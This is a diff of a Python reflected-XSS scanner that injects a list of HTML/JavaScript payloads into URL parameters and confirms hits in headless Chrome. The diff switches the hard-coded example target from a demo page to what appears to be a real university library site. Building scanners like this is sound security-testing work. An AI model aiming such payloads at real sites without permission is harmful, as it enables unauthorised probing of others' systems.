@@ -14,14 +14,13 @@ class Xss:
 
         self.chrome_options = webdriver.ChromeOptions()
         self.chrome_options.add_argument("--headless")
+        self.chrome_options.add_argument("--disable-gpu")
         self.chrome_options.add_argument("--window-size=1920x1080")
         self.chrome_options.add_argument("--disable-xss-auditor")
         # 禁用图片
         chrome_prefs = {}
         chrome_prefs["profile.default_content_settings"] = {"images": 2}
         self.chrome_options.experimental_options["prefs"] = chrome_prefs
-
-        self.driver = webdriver.Chrome(chrome_options=self.chrome_options)
 
         self.header = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0'}
         self.payloads = ['\'"/><img src=# onerror=alert(1);>',
@@ -36,13 +35,19 @@ class Xss:
 
     def reflect_xss(self):
         # http://demo.aisec.cn/demo/aisec/js_link.php?id=2&msg=abc
-        for params in self.target.split('&'):
-            for payload in self.payloads:
-                target = self.target.replace(params, params+payload)
-                r = requests.get(target, headers=self.header, timeout=2)
-                if payload in r.text:
-                    if self.check(target):
-                        print('可能存在xss漏洞\t'+target)
+        if '?' in self.target:
+            for params in self.target.split('&'):
+                for payload in self.payloads:
+                    target = self.target.replace(params, params+payload)
+                    try:
+                        r = requests.get(target, headers=self.header, timeout=2)
+                    except requests.exceptions.ConnectionError:
+                        continue
+                    except requests.exceptions.ReadTimeout:
+                        continue
+                    if payload in r.text:
+                        if self.check(target):
+                            print('可能存在xss漏洞\t'+target)
 
     def check(self, url):
         driver = webdriver.Chrome(chrome_options=self.chrome_options)
@@ -55,7 +60,7 @@ class Xss:
             pass
         return False
 
-    def scan(self):
+    def _scan(self):
         try:
             r = requests.get(self.target, headers=self.header, timeout=2)
             # print('get')
@@ -83,11 +88,12 @@ class Xss:
                     continue
                 return False
 
-    def run(self):
+    def scan(self):
+        print('\nxss检测\n')
         for self.target in self.targets:
             self.init()
             self.reflect_xss()
 
 
 if __name__ == '__main__':
-    Xss(['http://demo.aisec.cn/demo/aisec/js_link.php?id=2&msg=abc']).run()
+    Xss(['http://opac.jit.edu.cn/asord/asord_searchresult.php?type=02&q=&submit=%E6%A3%80%E7%B4%A2']).scan()
